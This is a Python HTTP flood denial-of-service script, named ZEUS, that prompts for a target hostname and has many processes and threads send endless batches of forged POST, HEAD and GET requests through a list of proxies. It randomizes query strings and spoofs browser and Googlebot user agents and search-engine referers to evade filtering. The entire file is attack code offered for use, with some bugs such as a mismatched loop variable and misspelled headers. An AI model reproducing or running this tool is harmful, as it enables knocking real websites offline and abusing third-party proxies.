#!/usr/bin/python3
# -*- coding: utf-8 -*-

from multiprocessing import Process, Pool
import random,socket,time, string, threading, re

global proxypool
proxypool = []
with open("proxys.txt") as data:
    for i in data:
        proxypool.append(i)

class ZEUS(object):
    DNS         = ""
    IP          = ""
    PORT        = 80
    ROUND       = 0
    WORKQUEUE   = []
    JOINTIMEOUT = 1.0
    def __init__(self, DNS, IP, PORT, ROUND):
        self.DNS   = DNS
        self.IP    = IP
        self.PORT  = PORT
        self.ROUND = ROUND
    def run(self):
        for i in range(self.ROUND):
            WORK = Striker(self.DNS, self.IP, self.PORT)
            WORK.run()
            self.WORKQUEUE.append(WORK)
        while len(self.WORKQUEUE) > 0:
            for listen in self.WORKQUEUE:
                try:
                    if work is not None and work.is_alive():
                        work.join(self.JOINTIMEOUT)
                    else:
                        self.WORKQUEUE.remove(work)
                except: pass
            time.sleep(.1)

class Striker(Process):
    def buildblock(self,length=random.randint(3,6)):
        return ''.join((random.choice(string.ascii_lowercase+string.ascii_uppercase) for i in range(length)))
    
    def generateQueryStr(self,url):
        if url.count("?")>0:
            param_joiner="&"
        else:
            param_joiner="?"
        key     = self.buildblock(random.randint(3,10))
        value   = self.buildblock(random.randint(3,10))
        element = ("%s%s=%s" % (param_joiner,key,value))
        return element

    def __init__(self, DNS, IP, PORT):
        self.DNS  = DNS
        self.IP   = IP
        self.PORT = PORT
        self.URL  = "http://"+self.DNS+"/" 
        if self.PORT is None: self.PORT = 80
        else: self.PORT = PORT
        self.useragents = [
            "Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
            "Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22"
            ]
        self.referers = [
            "https://duckduckgo.com/?q=",
            "http://api.duckduckgo.com/html/?q=",
            "http://yandex.ru/yandsearch?text=",
            "http://www.google.com/?q="
            ]
        self.headers = [
            "POST / HTTP/1.1\nHost: %s\nContent-length: 5235\nConneiton: Keep-Alive\n\n" % (self.DNS),
            "HEAD / HTTP/1.1\nHost: %s\nUser-Agent: %s\nCache-Control: no-cache\nContent-length: 0\nConneiton: Keep-Alive\n\n" % (self.DNS, self.useragents),
            "GET /%s HTTP/1.1\nHost: %s\nUser-Agent: %s\nIf-None-Match: %s\nIf-Modified-Since: %s\nAccept: */*\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\nAccept-Encoding: gzip,deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nConnection: Keep-Alive\n\n" % (self.generateQueryStr(self.URL), self.DNS, self.useragents, self.buildblock(random.randint(6,9)), time.ctime(time.time()))
        ]

    def fire(self, socketlist = []):
        while 1:
            for i in proxypool:
                self.spliter = re.split(":",i)
                try:
                    pack = ''.join([str(random.choice(self.headers)) for i in range(20)]).encode('utf-8')
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(self.spliter[0]),int(self.spliter[1])))
                    if s.sendto( pack, (str(self.spliter[0]), int(self.spliter[1])) ):
                        print("Sending from: " + self.spliter[0]+self.spliter[1])
                except: pass

    def run(self):
        while 1:
            for i in range(10):
                try:
                    t = threading.Thread(target = self.fire)
                    t.start()
                except:
                    time.sleep(.1)
            time.sleep(.1)

if __name__ == '__main__':
    DNS  = input("Target: ")
    IP   = socket.gethostbyname(DNS)
    PORT = 80
    zeus = ZEUS(DNS,IP,PORT,5)
    zeus.run()
